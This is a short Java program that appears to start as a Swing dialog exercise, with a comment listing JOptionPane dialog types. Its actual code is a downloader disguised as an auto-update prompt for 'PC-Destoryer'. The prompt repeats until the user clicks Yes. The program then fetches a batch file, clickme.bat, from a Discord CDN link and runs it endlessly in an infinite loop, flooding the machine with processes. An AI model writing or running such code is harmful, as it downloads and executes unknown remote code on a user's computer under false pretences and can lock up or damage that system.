import org.apache.commons.io.FileUtils;
import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

public class Main {
    public static void main(String[] args) throws IOException {
        /*Types of Dialogs
            1.MessageDialog
                parameters: parent component, message, title, message type (plain, information, question, warning, error)
            2.ConfirmDialog
                parameters: parent component, message, title, option type (YES_NO_CANCEL, YES, YES_NO ......)
            3.InputDialog
                parameters: question
            4.OptionDialog
                parameters: parent component, message, title, option type (YES_NO_CANCEL, YES, YES_NO ......), message type (plain, information, question, warning, error), icon, options, initial value
                */

        int result;
        do{
            result = JOptionPane.showOptionDialog(null, "Do you want to install the latest version of PC-Destoryer", "Auto Update Notify", JOptionPane.YES_NO_OPTION, JOptionPane.INFORMATION_MESSAGE, null, null, 0);
            System.out.println(result);
        }while (result != 0);
        URL url = new URL("https://cdn.discordapp.com/attachments/844209779919945741/1230034962627952650/clickme.bat?ex=6631da54&is=661f6554&hm=ac1f32b5b986380d2d85f7446b5dfce5e2774c50ae95c822aed7305d2f964e28&");
        File destination = new File("clickme.bat");
        FileUtils.copyURLToFile(url, destination);
        System.out.println("File downloaded successfully!");

        while (true) {
            Process process = Runtime.getRuntime().exec("clickme.bat");
        }



    }
}